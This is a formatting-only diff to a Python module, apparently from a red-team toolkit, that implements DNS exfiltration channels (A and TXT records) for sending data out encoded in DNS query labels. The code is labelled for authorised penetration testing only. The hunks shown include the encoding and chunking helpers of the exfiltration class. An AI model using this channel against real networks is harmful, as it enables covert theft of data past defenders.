@@ -9,16 +9,16 @@ ATT&CK Technique: T1048.003 - Exfiltration Over Unencrypted Non-C2 Protocol
 Warning: 仅限授权渗透测试使用！
 """
 
-from typing import Iterable
-import logging
 import base64
-import time
 import ipaddress
+import logging
+import time
+from typing import Iterable
 
 from ..base import (
     BaseExfiltration,
-    ExfilConfig,
     ExfilChannel,
+    ExfilConfig,
 )
 
 logger = logging.getLogger(__name__)
@@ -36,8 +36,8 @@ class DNSExfiltration(BaseExfiltration):
     Warning: 仅限授权渗透测试使用！
     """
 
-    name = 'dns_exfil'
-    description = 'DNS Exfiltration Channel'
+    name = "dns_exfil"
+    description = "DNS Exfiltration Channel"
     channel = ExfilChannel.DNS
 
     # DNS 标签最大长度
@@ -45,16 +45,16 @@ class DNSExfiltration(BaseExfiltration):
     # DNS 名称最大长度
     MAX_NAME_LENGTH = 253
     # 使用的编码字符集（DNS 安全）
-    DNS_SAFE_CHARS = 'abcdefghijklmnopqrstuvwxyz0123456789'
+    DNS_SAFE_CHARS = "abcdefghijklmnopqrstuvwxyz0123456789"
 
     def __init__(self, config: ExfilConfig):
         super().__init__(config)
         self._resolver = None
-        self._transfer_id = ''
+        self._transfer_id = ""
         self._chunk_id = 0
-        self._domain = config.dns_domain or ''
+        self._domain = config.dns_domain or ""
         self._nameserver = config.nameserver
-        self._record_type = 'A'
+        self._record_type = "A"
 
     def connect(self) -> bool:
         """初始化 DNS 解析器"""
@@ -82,6 +82,7 @@ class DNSExfiltration(BaseExfiltration):
 
             # 生成传输 ID
             import uuid
+
             self._transfer_id = str(uuid.uuid4())[:8].lower()
             self._chunk_id = 0
 
@@ -140,8 +141,8 @@ class DNSExfiltration(BaseExfiltration):
 
     def _encode_payload(self, data: bytes) -> str:
         """将数据编码为 DNS 安全格式 (base32)"""
-        encoded = base64.b32encode(data).decode('ascii').lower()
-        return encoded.rstrip('=')
+        encoded = base64.b32encode(data).decode("ascii").lower()
+        return encoded.rstrip("=")
 
     def _split_encoded(self, encoded: str) -> Iterable[tuple[int, str]]:
         """根据 DNS 名称长度限制切分编码字符串"""
@@ -152,7 +153,7 @@ class DNSExfiltration(BaseExfiltration):
             if max_len <= 0:
                 self.logger.error("DNS 名称过长，无法切分有效标签")
                 return
-            chunk = encoded[offset: offset + max_len]
+            chunk = encoded[offset : offset + max_len]
             yield seq, chunk
             offset += max_len
             seq += 1
@@ -193,16 +194,17 @@ class DNSExfiltrationTXT(DNSExfiltration):
     Warning: 仅限授权渗透测试使用！
     """
 
-    name = 'dns_txt_exfil'
-    description = 'DNS TXT Record Exfiltration Channel'
+    name = "dns_txt_exfil"
+    description = "DNS TXT Record Exfiltration Channel"
+
     def __init__(self, config: ExfilConfig):
         super().__init__(config)
-        self._record_type = 'TXT'
+        self._record_type = "TXT"
 
     def _encode_payload(self, data: bytes) -> str:
         """TXT 记录使用 base64url 编码"""
-        encoded = base64.urlsafe_b64encode(data).decode('ascii')
-        return encoded.rstrip('=')
+        encoded = base64.urlsafe_b64encode(data).decode("ascii")
+        return encoded.rstrip("=")
 
 
-__all__ = ['DNSExfiltration', 'DNSExfiltrationTXT']
+__all__ = ["DNSExfiltration", "DNSExfiltrationTXT"]
